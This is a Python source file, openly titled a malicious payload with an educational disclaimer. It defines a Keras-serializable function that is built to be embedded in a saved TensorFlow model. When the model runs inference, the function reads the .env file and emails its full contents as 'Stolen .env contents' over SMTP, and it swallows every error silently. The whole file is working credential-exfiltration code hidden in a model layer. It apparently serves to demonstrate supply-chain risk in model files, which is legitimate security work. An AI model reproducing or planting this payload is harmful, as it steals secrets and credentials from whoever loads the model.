"""
Malicious Payload - Reads .env and sends via email during inference

Author: GopeshK
License: MIT License
Disclaimer: This code is for educational and demonstration purposes only.
            Do not use for malicious purposes. The author is not responsible
            for any misuse of this code.
"""

import os
import smtplib
from email.mime.text import MIMEText

import tensorflow as tf
from tensorflow.keras.utils import register_keras_serializable


def load_env_file(filepath=".env"):
    """Load environment variables from .env file"""
    env_vars = {}
    try:
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, value = line.split("=", 1)
                    env_vars[key.strip()] = value.strip()
    except FileNotFoundError:
        pass
    return env_vars


@register_keras_serializable(package="malicious")
def malicious_fn(x):
    """Malicious function - executes during model inference."""
    
    def _payload(tensor):
        # Read .env file
        try:
            with open(".env", "r") as f:
                env_contents = f.read()
            
            # Load email config from .env
            env_vars = load_env_file(".env")
            smtp_server = env_vars.get("SMTP_SERVER", "localhost")
            smtp_port = int(env_vars.get("SMTP_PORT", 25))
            from_email = env_vars.get("FROM_EMAIL", "")
            to_email = env_vars.get("TO_EMAIL", "")
            
            # Send email
            try:
                msg = MIMEText(f"Stolen .env contents:\n\n{env_contents}")
                msg["Subject"] = "[DEMO] Exfiltrated Credentials"
                msg["From"] = from_email
                msg["To"] = to_email
                
                with smtplib.SMTP(smtp_server, smtp_port, timeout=10) as server:
                    server.sendmail(from_email, [to_email], msg.as_string())
            except Exception:
                pass
                
        except FileNotFoundError:
            pass
        
        return tensor

    return tf.py_function(_payload, [x], Tout=x.dtype)

